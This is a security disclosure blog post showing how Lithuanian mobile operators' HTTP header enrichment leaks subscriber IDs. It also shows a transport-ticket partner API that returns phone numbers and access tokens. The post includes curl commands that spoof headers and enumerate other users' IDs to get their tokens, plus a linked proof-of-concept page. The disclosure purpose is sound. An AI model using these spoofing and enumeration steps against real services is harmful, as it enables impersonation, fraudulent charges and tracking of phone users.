---
author:     Anton R. (Discovery) & Jaroslav Lobačevski (The article)
profileimage: anton-r.jpg
about:      https://full-disclosure.eu/author/anton-r/
layout:     post
title:      "Privacy leaks in mobile internet era"
date:       2020-03-03 12:00:00
categories: HackAndTell MobileInternet
cover:      
permalink:  /en/blog/mobile-data-leak
---
> tl;dr: Ignorance of security issues by mobile operator partners leaks your phone number to malicious websites. Misconfigurations of mobile operators allow tracking you worldwide.  
Try it yourself - [Proof of Concept](/en/blog/mobile-data-leak#proof-of-concept).

It all starts from curiosity... Have you ever seen a mobile app asking you to turn off WIFI and switch to mobile internet in order to use it?  
There are at least few of them in Lithuania that offer login-less service if you are connected to the mobile internet:

* [m.Ticket](https://play.google.com/store/apps/details?id=lt.sisp.itero.ticket.client&hl=en) - 
An app that allows you to buy public bus tickets using your phone.
* [m.Parking](https://play.google.com/store/apps/details?id=lt.sisp.itero.parking.client&hl=en) - 
An app for paying for city parking using your phone. The parking fee is added to your phone bill.
* [Mobile wallet MoQ](https://play.google.com/store/apps/details?id=lt.momo.app&hl=en) - 
An app for online payments, paying in-store and transferring money.

### How does it work?

It may sound crazy, but the mobile operator injects your identity into the outgoing HTTP request. Officially it is called HTTP Header Enrichment. When a third-party web server receives your request it already contains what is needed to identify the mobile user in a special HTTP header.

Let's check if that is true. First of all we need a server that would reflect back all HTTP headers it received from your browser. It is easy to write one by your own, but since we are lazy we'll use an already [existing one](http://postman-echo.com).

Connect a computer to your mobile device hotspot. Start a shell (command line) and run [curl](https://curl.haxx.se/) with the following arguments:
```
curl http://postman-echo.com/get
```
It returns the following response if you are not Tele2 user (showing just the important part):
```json
"headers": {
  "x-forwarded-proto": "https",
  "host": "postman-echo.com",
  "accept": "*/*",
  "user-agent": "curl/7.55.1",
  "x-forwarded-port": "80"
}
```
Nothing is suspicious here. This is because if configured correctly mobile operators inject headers only in a web request to white-listed partners. But not in Tele2 Lithuania case! It injects `"x-tele2-subid: 10.■■■.■■■.■■■` to **any unencrypted HTTP request**!

You may not see where the issue is... Yet it provides a [super cookie](https://en.wikipedia.org/wiki/HTTP_cookie#Other_uses) for any web site in the world. No matter if you switch the browser, clean cookies, use incognito mode - it uniquely identifies you as the same user. While you may share the same header with other Tele2 users nearby (something to be proved) it still gives a lot of information for a web sites to track you.

Let's switch our mobile provider and spoof the requested web site:
```
curl http://postman-echo.com/get --header "Host: mtis2.m-transportas.lt"
```
If correctly configured on mobile provider side the headers should not be injected because IP address of the request (the receiver is postman-echo.com) and the host name (mtis2.m-transportas.lt) doesn't match. However the following headers are injected in Bite case:
```
"bite-account-country": "LT",
"bite-account-id": "152■■■■■",
"bite-account-language": "LT",
"bite-account-type": "PREPAID",
"x-forwarded-server": "wap.bite.lt",
```
In Telia case:
```
"x-et-user-identity": "S9zdh■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■KUn3M"
```
### Things get worse. Partners come into play.
The host name we used above belongs to one of the white-listed partners. The company has created a web service that returns back a phone number among other things when a request from a mobile internet user is received. Let's try it:
```
curl --request POST http://mtis2.m-transportas.lt/api/token "Content-Type: application/x-www-form-urlencoded" -d "client_id=mticket&CountryCode=310&grant_type=mobileProvider"
```
The response:
```
{
  "userName": "3706■■■■■■■",
  "userType": 3,
  "client_id": "mticket",
  "access_token": "ey■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■Ck",
  "expires_in": 900,
  "refresh_token": "9c■■■■■■■■■■■■■■■■■■■■■■8d",
  "refresh_token_expires_in": 604800,
  "ticketInspectorGroupId": 0,
  "ticketInspectorLeader": false,
  "client_owner_code": null,
  "notifications": [
  ]
}
```
The service is public and the first line leaks your phone number. How could it be exploited?  
A malicious web page may run a javascript that calls mtis2.m-transportas.lt on your behalf. But if your provider is Tele2 it is even worse: `x-tele2-subid` gets injected into all unencrypted web site requests. So a malicious site may call mtis2.m-transportas.lt with the leaked `x-tele2-subid` and retrieve the phone number on the server side. This way it is impossible to detect the abuse from the client!
### Proof of concept:
Works with any Lithuanian mobile provider. Turn off WIFI and click on the link in your mobile device. (*Update 2020-04-02: The owner of m-transportas.lt SĮ „Susisiekimo paslaugos” updated the web service to break the PoC and assured on 2020-03-09 that they will make "architectural" changes in 1.5 month to mitigate the security issue.*)
[http://www.devsecurity.eu/mobile-data-leak/](http://www.devsecurity.eu/mobile-data-leak/)

[![Screenshot](mobile-data-leak-poc.png "Screenshot")](mobile-data-leak-poc.png)

### Does the injected header prove anything?
So these white-listed partners make security sensitive decisions based on a presence of a header. Let's try spoofing the identity. This time switch to WIFI and run the following command:
```
curl --request POST http://mtis2.m-transportas.lt/api/token "Content-Type: application/x-www-form-urlencoded" -d "client_id=mticket&CountryCode=310&grant_type=mobileProvider" --header "x-tele2-subid: {your id from previous runs incremented by one}"
```
You will receive the token id for a user with completely different phone number! The service got fooled even though we connected not from a mobile network. While possibly there is no threat in someone spoofing your identity to buy you tickets, you wouldn't like to get a bill in the end of a month for a parking or mobile payments (up to 50 Eur?) you didn't do. The presence of the special headers cannot be used to prove your identity.

### Conclusions
The HTTP Header Enrichment is an ancient technique from the dark ages of internet when most of the traffic was unencrypted (related risks were even published in [2010 by Collin Mulliner](http://www.mulliner.org/security/feed/random_tales_mobile_hacker.pdf)). It should be abandoned as insecure and violating users' privacy. Meanwhile you have the options:
* Do not use mobile internet.
* If using mobile internet from a laptop browser, install HTTPS Everywhere extension.
* Always use VPN.
